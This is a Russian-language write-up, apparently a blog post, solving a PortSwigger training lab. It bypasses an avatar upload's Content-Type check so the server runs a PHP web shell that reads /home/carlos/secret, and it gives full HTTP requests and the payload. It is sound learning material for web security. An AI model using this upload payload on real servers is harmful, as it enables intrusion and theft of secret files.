---
title: "Web shell upload via Content-Type restriction bypass"
date: 2025-08-07
tags: [web, writeup]  
categories: [PortSwigger]
tagline: ""
header:
  overlay_image: /assets/images/IMG_writeups/IMG_PortSwigger/ps_logo.webp
  overlay_filter: 0.5 
  overlay_color: "#fff"
  actions:
    - label: "Lab PortSwigger"
      url: "https://portswigger.net/web-security/learning-paths/server-side-vulnerabilities-apprentice/file-upload-apprentice/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass"
classes: wide
---

Эта лаборатория содержит ~~меня в заключении~~ **уязвимость в загрузке файлов**, которые приводит к **Path Traversal**. Сервер пытается запретить пользователям загружать файлы непредвиденных типов, но для проверки подаются входные данные, управляемые пользователем.

Для решения лабораторной работы нужно загрузить базовую веб-оболочку PHP и использовать ее для извлечения содержимого файла `/home/carlos/secret`.

Для входа даны креды: `wiener:peter`.

```
https://0a66008a034946bc80829ea600770056.web-security-academy.net/
```

## Solution

Для начала залогинимся в свой аккаунт.

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_file_upload/IMG_Web_shell_upload_via_Content-Type_restriction_bypass/1.png){: height="200" .align-center}

Мы видим функцию загрузки аватара. Из условия лабы мне известно, что она уязвима. Попробую загрузить фотку моей кошки)

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_file_upload/IMG_Web_shell_upload_via_Content-Type_restriction_bypass/2.png){: height="200" .align-center}

Она успешно была загружена с помощью следующего запроса:3

```http
OST /my-account/avatar HTTP/2
Host: 0a66008a034946bc80829ea600770056.web-security-academy.net
Cookie: session=DBk7A2HKKUevqloZ85jEImxsTXiEZwPJ
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:135.0) Gecko/20100101 Firefox/135.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a66008a034946bc80829ea600770056.web-security-academy.net/my-account?id=wiener
Content-Type: multipart/form-data; boundary=----geckoformboundarya63a36a7661691f5af58caea0ff6e16d
Content-Length: 50510
Origin: https://0a66008a034946bc80829ea600770056.web-security-academy.net
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

------geckoformboundarya63a36a7661691f5af58caea0ff6e16d
Content-Disposition: form-data; name="avatar"; filename="cat.jpg"
Content-Type: image/jpeg

...

------geckoformboundarya63a36a7661691f5af58caea0ff6e16d
Content-Disposition: form-data; name="user"

wiener
------geckoformboundarya63a36a7661691f5af58caea0ff6e16d
Content-Disposition: form-data; name="csrf"

Gm1o2X2rtPRvsllWcciUiLdiBxaIJ2Wz
------geckoformboundarya63a36a7661691f5af58caea0ff6e16d--
```

Попробую заменить тело запроса, заменив картинку на следующий `php` код: `<?php echo file_get_contents('/home/carlos/secret'); ?>`. Так же замению расширение файла на `.php`:

```http
POST /my-account/avatar HTTP/2
Host: 0a66008a034946bc80829ea600770056.web-security-academy.net
Cookie: session=DBk7A2HKKUevqloZ85jEImxsTXiEZwPJ
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:135.0) Gecko/20100101 Firefox/135.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a66008a034946bc80829ea600770056.web-security-academy.net/my-account?id=wiener
Content-Type: multipart/form-data; boundary=----geckoformboundarya63a36a7661691f5af58caea0ff6e16d
Content-Length: 521
Origin: https://0a66008a034946bc80829ea600770056.web-security-academy.net
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

------geckoformboundarya63a36a7661691f5af58caea0ff6e16d
Content-Disposition: form-data; name="avatar"; filename="cat.php"
Content-Type: image/jpeg

<?php echo file_get_contents('/home/carlos/secret'); ?>
 
------geckoformboundarya63a36a7661691f5af58caea0ff6e16d
Content-Disposition: form-data; name="user"

wiener
------geckoformboundarya63a36a7661691f5af58caea0ff6e16d
Content-Disposition: form-data; name="csrf"

Gm1o2X2rtPRvsllWcciUiLdiBxaIJ2Wz
------geckoformboundarya63a36a7661691f5af58caea0ff6e16d--
```

Запрос успешно был выполнен. Открою аватар в отдельном окне.

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_file_upload/IMG_Web_shell_upload_via_Content-Type_restriction_bypass/3.png){: height="200" .align-center}

А вот и необходимый код:

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_file_upload/IMG_Web_shell_upload_via_Content-Type_restriction_bypass/4.png){: height="200" .align-center}